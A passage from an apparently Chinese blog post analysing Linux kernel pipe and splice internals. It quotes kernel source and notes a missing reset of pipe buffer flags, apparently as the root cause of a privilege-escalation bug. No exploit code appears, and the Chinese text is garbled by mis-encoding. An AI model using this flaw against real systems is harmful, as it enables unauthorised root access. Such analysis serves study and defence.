class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = <span class="hljs-number">0</span>;<br>__pipe_lock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ç®¡é“æ»¡äº†ï¼Œæˆ‘ä»¬åªåœ¨å¼€å§‹è¯»å–æ—¶å”¤é†’å†™è€…</span><br><span class="hljs-comment"> * ä»¥é¿å…æ²¡æœ‰å¿…è¦çš„å”¤é†’</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä½†å½“æˆ‘ä»¬å”¤é†’å†™è€…æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªåŒæ­¥å”¤é†’(WF_SYNC)</span><br><span class="hljs-comment"> * å› ä¸ºæˆ‘ä»¬æƒ³è¦ä»–ä»¬è¡ŒåŠ¨èµ·æ¥å¹¶ä¸ºæˆ‘ä»¬ç”Ÿæˆæ›´å¤šæ•°æ®</span><br><span class="hljs-comment"> */</span><br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br><span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>n.type = WATCH_TYPE_META;<br>n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>n.info = watch_sizeof(n);<br><span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += <span class="hljs-keyword">sizeof</span>(n);<br>total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<span class="hljs-comment">// ç®¡é“éç©ºï¼Œé€ buffer è¯»å‡ºæ•°æ®</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<br><span class="hljs-type">size_t</span> chars = buf-&gt;len;<br><span class="hljs-type">size_t</span> written;<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>chars = total_len;<br>&#125;<br><br>error = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (error) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = error;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>            <span class="hljs-comment">// å°† buffer å¯¹åº” page æ•°æ®æ‹·è´å‡ºæ¥</span><br>written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br><span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += chars;<br>buf-&gt;offset += chars;<br>buf-&gt;len -= chars;<br><br><span class="hljs-comment">/* è¿™æ˜¯ä¸€ä¸ª packet bufferï¼Ÿæ¸…ç†å¹¶é€€å‡º */</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>total_len = chars;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<span class="hljs-comment">// buffer ç©ºäº†ï¼Œé‡Šæ”¾</span><br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>tail++;<span class="hljs-comment">// è¢«è¯»çš„ buffer å‡ºé˜Ÿ</span><br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br>total_len -= chars;<br><span class="hljs-keyword">if</span> (!total_len)<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">/* å¸¸è§„è·¯å¾„ï¼šè¯»å–æˆåŠŸ */</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail))<span class="hljs-comment">/* More to do? */</span><br><span class="hljs-keyword">continue</span>;<span class="hljs-comment">// æ²¡è¯»å®Œï¼Œè¿˜æœ‰æ•°æ®ï¼Œæ¥ç€è¯»</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬åªæœ‰åœ¨ç¡®å®æ²¡è¯»åˆ°ä¸œè¥¿æ—¶åˆ°è¾¾è¿™é‡Œ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç„¶è€Œï¼Œæˆ‘ä»¬æˆ–è®¸å·²çœ‹åˆ°ï¼ˆå¹¶ç§»é™¤ï¼‰ ä¸€ä¸ª size ä¸º 0 çš„ bufferï¼Œ</span><br><span class="hljs-comment"> * è¿™å¯èƒ½ä¼šåœ¨ buffers ä¸­åˆ›é€ ç©ºé—´</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä½ æ— æ³•é€šè¿‡ä¸€ä¸ªç©ºå†™å…¥æ¥åˆ¶é€  size ä¸º 0 çš„ pipe buffersï¼ˆpacket mode ä¹Ÿä¸è¡Œï¼‰</span><br><span class="hljs-comment"> * ä½†è‹¥å†™è€…åœ¨å°è¯•å¡«å……ä¸€ä¸ªå·²ç»åˆ†é…å¹¶æ’å…¥åˆ° buffer æ•°ç»„ä¸­</span><br><span class="hljs-comment"> * çš„ buffer æ—¶è·å¾—äº†ä¸€ä¸ª EFAULTï¼Œåˆ™è¿™æ˜¯æœ‰å¯èƒ½å‘ç”Ÿçš„</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ•…æˆ‘ä»¬ä»éœ€åœ¨ã€éå¸¸ã€‘ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„æƒ…å†µï¼š</span><br><span class="hljs-comment"> * â€œç®¡é“æ»¡äº†ï¼Œä½†æˆ‘ä»¬æ²¡æœ‰è·å¾—æ•°æ®â€ä¸‹</span><br><span class="hljs-comment"> * å”¤é†’ä»»ä½•ç­‰å¾…çš„å†™è€…</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(was_full))<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä½†å› ä¸ºæˆ‘ä»¬æ²¡æœ‰è¯»åˆ°ä»»ä½•ä¸œè¥¿ï¼Œè‹¥æˆ‘ä»¬æ‰“æ–­äº†ï¼Œåˆ™è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥</span><br><span class="hljs-comment"> * è¿”å›ä¸€ä¸ª-ERESTARTSYSï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºæˆ‘ä»¬å·²ç»å®Œæˆäº†ä»»ä½•æ‰€éœ€çš„ç¯å¢ƒï¼Œæ²¡æœ‰å¿…è¦æ ‡è®°ä»»ä½•å¯è®¿é—®. </span><br><span class="hljs-comment"> * ä¸”æˆ‘ä»¬å·²é‡Šæ”¾äº†é”ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>__pipe_lock(pipe);<br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>wake_next_reader = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>wake_next_reader = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">if</span> (was_full)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (wake_next_reader)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>file_accessed(filp);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ï¼šå¯¹äºä¸€ä¸ªåˆšåˆšå»ºç«‹çš„ç®¡é“ï¼Œå…¶ buffer æ•°ç»„å…¶å®å¹¶æ²¡æœ‰åˆ†é…å¯¹åº”çš„é¡µé¢ç©ºé—´ï¼Œä¹Ÿæ²¡æœ‰è®¾ç½®æ ‡å¿—ä½ï¼›åœ¨æˆ‘ä»¬å‘ç®¡é“å†…å†™å…¥æ•°æ®æ—¶ä¼šé€šè¿‡ buddy system ä¸ºå¯¹åº” buffer åˆ†é…æ–°çš„é¡µæ¡†ï¼Œ<strong>å¹¶è®¾ç½® PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—ä½ï¼Œæ ‡å¿—è¯¥ buffer å¯ä»¥è¿›è¡Œå†™å…¥</strong>ï¼›è€Œå½“æˆ‘ä»¬ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ®ä¹‹åï¼Œçºµä½¿ä¸€ä¸ª buffer å¯¹åº”çš„ page ä¸Šçš„æ•°æ®è¢«è¯»å®Œäº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸ä¼šé‡Šæ”¾è¯¥ pageï¼Œè€Œå¯ä»¥ä¹Ÿä¼šç›´æ¥æŠ•å…¥åˆ°ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­ï¼Œ<strong>å› æ­¤ä¼šä¿ç•™ PIPE_BUF_FLAG_CAN_MERGE æ ‡å¿—ä½</strong></p><h2 id="spliceï¼šæ–‡ä»¶ä¸ç®¡é“é—´æ•°æ®æ‹·è´">spliceï¼šæ–‡ä»¶ä¸ç®¡é“é—´æ•°æ®æ‹·è´</h2><p>å½“æˆ‘ä»¬æƒ³è¦å°†ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æƒ³æ³•æ˜¯æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶åå°†æºæ–‡ä»¶æ•°æ®è¯»å…¥åå†å†™å…¥ç›®æ ‡æ–‡ä»¶ï¼Œä½†è¿™æ ·çš„åšæ³•éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´æ¥å›è¿›è¡Œæ•°æ®æ‹·è´ï¼Œ<strong>å…·æœ‰å¯è§‚çš„å¼€é”€</strong></p><p>å› æ­¤ä¸ºäº†å‡å°‘è¿™æ ·çš„å¼€é”€ï¼Œ <code>splice</code>è¿™ä¸€ä¸ªéå¸¸ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨åº”è¿è€Œç”Ÿï¼Œå…¶ä½œç”¨æ˜¯<strong>åœ¨æ–‡ä»¶ä¸ç®¡é“ä¹‹é—´è¿›è¡Œæ•°æ®æ‹·è´</strong>ï¼Œä»¥æ­¤<strong>å°†å†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´ä¹‹é—´çš„æ•°æ®æ‹·è´è½¬å˜ä¸ºå†…æ ¸ç©ºé—´å†…çš„æ•°æ®æ‹·è´ï¼Œä»è€Œé¿å…äº†æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´çš„æ‹·è´é€ æˆçš„å¼€é”€</strong></p><p>glibc ä¸­çš„ wrapper å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE         <span class="hljs-comment">/* See feature_test_macros(7) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out,</span><br><span class="hljs-params">               <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure><p>splice ç³»ç»Ÿè°ƒç”¨<strong>æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨ç®¡é“åœ¨å†…æ ¸ç©ºé—´ä¸­è¿›è¡Œæ•°æ®æ‹·è´</strong>ï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯ï¼Œç®¡é“æ˜¯ä¸€ä¸ªååˆ†å¥½ç”¨çš„å†…æ ¸ç¼“å†²åŒºï¼Œäºæ˜¯ splice ç³»ç»Ÿè°ƒç”¨é€‰æ‹©ä½¿ç”¨ç®¡é“ä½œä¸ºä¸­é—´çš„æ•°æ®ç¼“å†²åŒº</p><p>å½“ä½ æƒ³è¦å°†æ•°æ®ä»ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ‹·è´åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­ï¼Œåªéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œä¹‹åä½¿ç”¨ splice ç³»ç»Ÿè°ƒç”¨å°†æ•°æ®ä»æºæ–‡ä»¶æè¿°ç¬¦æ‹·è´åˆ°ç®¡é“ä¸­ã€å†ä½¿ç”¨ splice ç³»ç»Ÿè°ƒç”¨å°†æ•°æ®ä»ç®¡é“ä¸­æ‹·è´åˆ°ç›®çš„æ–‡ä»¶æè¿°ç¬¦å³å¯ã€‚è¿™æ ·çš„è®¾è®¡ä½¿å¾—æˆ‘ä»¬åªéœ€è¦ä¸¤æ¬¡ç³»ç»Ÿè°ƒç”¨ä¾¿èƒ½å®Œæˆæ•°æ®åœ¨ä¸åŒæ–‡ä»¶æè¿°ç¬¦é—´çš„æ‹·è´å·¥ä½œï¼Œä¸”<strong>æ•°æ®çš„æ‹·è´éƒ½åœ¨å†…æ ¸ç©ºé—´ä¸­å®Œæˆï¼Œæå¤§åœ°å‡å°‘äº†å¼€é”€</strong></p><p>splice ç³»ç»Ÿè°ƒç”¨æ­£å¼æ“ä½œå‰éƒ½æ˜¯ä¸€äº›åŸºç¡€çš„æ£€æŸ¥å·¥ä½œï¼Œè¿™ä¸€å—ä¸æ·±å…¥åˆ†æï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">SYS_splice</span>()<span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å¯ç”¨</span><br><span class="hljs-built_in">__do_splice</span>()<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å…¥è®¾ç½®äº†åç§»æˆ–å‡ºè®¾ç½®äº†åç§»ï¼ˆä»»ä¸€åˆ™è¿”å›ï¼‰</span><br><span class="hljs-built_in">do_splice</span>()<span class="hljs-comment">// åˆ†æµ</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆæ–‡ä»¶ä¸ç®¡é“é—´çš„åˆ†æµå‘ç”Ÿåœ¨ <code>do_splice()</code> å‡½æ•°ï¼š</p><ul><li>ä»ç®¡é“è¯»å–åˆ°ç®¡é“ï¼Œè°ƒç”¨ <code>splice_pipe_to_pipe()</code></li><li>ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“ï¼Œè°ƒç”¨ <code>splice_file_to_pipe()</code></li><li>ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶ï¼Œè°ƒç”¨ <code>do_splice_from()</code></li></ul><h3 id="ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“">ä»æ–‡ä»¶è¯»å–åˆ°ç®¡é“</h3><p>ä»æ–‡ä»¶è¯»å–æ•°æ®åˆ°ç®¡é“çš„æ ¸å¿ƒåŸç†æ˜¯ï¼š<strong>å°† pipe_buffer å¯¹åº”çš„ page è®¾ç½®ä¸ºæ–‡ä»¶æ˜ å°„çš„ page</strong></p><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">splice_file_to_pipe</span>()</span><br><span class="hljs-function"><span class="hljs-title">do_splice_to</span>()</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>do_splice_to</code> ä¸­æœ€ç»ˆä¼šè°ƒç”¨åˆ°å†…æ ¸æ–‡ä»¶ç»“æ„ä½“å‡½æ•°è¡¨çš„ <code>splice_read</code> æŒ‡é’ˆï¼Œå¯¹äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€è¯¥å‡½æ•°æŒ‡é’ˆä¸åŒï¼Œä»¥ ext4 æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼ŒæŸ¥è¡¨ <code>ext4_file_operations</code>ï¼Œå¯¹åº”è°ƒç”¨çš„å‡½æ•°åº”ä¸º <code>generic_file_splice_read</code>ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">generic_file_splice_read()<br>    call_read_iter()<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ˜¯æ–‡ä»¶å‡½æ•°è¡¨ä¸­ <code>read_iter()</code> çš„ wrapperï¼Œå¯¹ ext4 è€Œè¨€å¯¹åº”è°ƒç”¨ <code>ext4_file_read_iter</code>ï¼Œæºç æ¯”è¾ƒå¤šï¼Œè¿™é‡Œåªè´´å‡ºæ ¸å¿ƒè°ƒç”¨é“¾ï¼Œæœ€ç»ˆè°ƒç”¨åˆ°æ ¸å¿ƒå‡½æ•°æ˜¯ <code>filemap_read()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">ext4_file_read_iter()<br>    generic_file_read_iter()<br>    filemap_read()<br>    filemap_get_pages()<span class="hljs-comment">// è·å–åˆ°æ–‡ä»¶å¯¹åº”æ˜ å°„çš„é¡µé¢é›†</span><br>    copy_page_to_iter()<span class="hljs-comment">// è¿›è¡Œé¡µé¢æ‹·è´ï¼ˆå•ä½ä¸ºå•ä¸ªé¡µé¢ï¼‰</span><br>    __copy_page_to_iter()<br>    copy_page_to_iter_pipe()<span class="hljs-comment">// æˆ‘ä»¬æ˜¯ç®¡é“ï¼Œæ‰€ä»¥èµ°å…¥è¯¥åˆ†æ”¯</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆåœ¨ <code>copy_page_to_iter_pipe()</code> ä¸­ï¼Œå°†å¯¹åº”çš„ <code>pipe_buffer-&gt;page</code> è®¾ä¸º<strong>æ–‡ä»¶æ˜ å°„çš„é¡µé¢é›†çš„å¯¹åº”é¡µæ¡†</strong>ï¼Œå°†é¡µæ¡†å¼•ç”¨è®¡æ•° + 1ï¼ˆ<code>get_page()</code>ï¼‰ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ª<strong>ä»æ–‡ä»¶è¯»å–æ•°æ®åˆ°ç®¡é“çš„è¿‡ç¨‹</strong>ï¼Œå› ä¸ºæ˜¯ç›´æ¥å»ºç«‹é¡µé¢çš„æ˜ å°„ï¼Œæ‰€ä»¥æ¯æ¬¡æ“ä½œåéƒ½ä¼šå°† head +1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br><span class="hljs-type">size_t</span> off;<br><br><span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>bytes = i-&gt;count;<br><br><span class="hljs-keyword">if</span> (unlikely(!bytes))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!sanity(i))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><span class="hljs-keyword">if</span> (off) &#123;<br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br><span class="hljs-comment">/* merge with the last one */</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°â€”â€”è¯¥æ“ä½œ<strong>ç¼ºå¤±äº†å¯¹ pipe_buffer-&gt;flags çš„é‡æ–°èµ‹å€¼æ“ä½œ</strong></p><h3 id="ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶">ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶</h3><p><code>do_splice_from</code> æœ€ç»ˆä¼šè°ƒç”¨å¯¹åº”å†…æ ¸æ–‡ä»¶ç»“æ„çš„å‡½æ•°è¡¨ä¸­çš„ <code>splice_write()</code> æŒ‡é’ˆï¼Œå°† pipe_buffer æ•°ç»„å¯¹åº”é¡µé¢ä¸Šå†…å®¹è¯»å‡ºï¼Œå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå¯¹äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€è¯¥å‡½æ•°æŒ‡é’ˆä¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))<br><span class="hljs-keyword">return</span> warn_unsupported(out, <span class="hljs-string">&quot;write&quot;</span>);<br><span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥ ext4 æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>iter_file_splice_write</code> å‡½æ•°ï¼Œä¹‹åå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">iter_file_splice_write</span>(ï¼‰<br>splice_from_pipe_next()<span class="hljs-comment">// æ£€æŸ¥ç®¡é“å¯ç”¨æ€§</span><br><span class="hljs-built_in">vfs_iter_write</span>()<span class="hljs-comment">// è¯»å‡ºç®¡é“æ•°æ®å†™å…¥æ–‡ä»¶</span><br><span class="hljs-built_in">do_iter_write</span>()<br><span class="hljs-built_in">do_iter_readv_writev</span>()<br>call_write_iter <span class="hljs-comment">// ä¸Šå±‚ä¼ å…¥typeä¸º WRITEï¼Œèµ°å…¥è¯¥åˆ†æ”¯</span><br></code></pre></td></tr></table></figure><p><code>call_write_iter</code> æ˜¯æ–‡ä»¶å‡½æ•°è¡¨ä¸­ <code>write_iter()</code> çš„ wrapperï¼Œå¯¹ ext4 è€Œè¨€å¯¹åº”è°ƒç”¨ 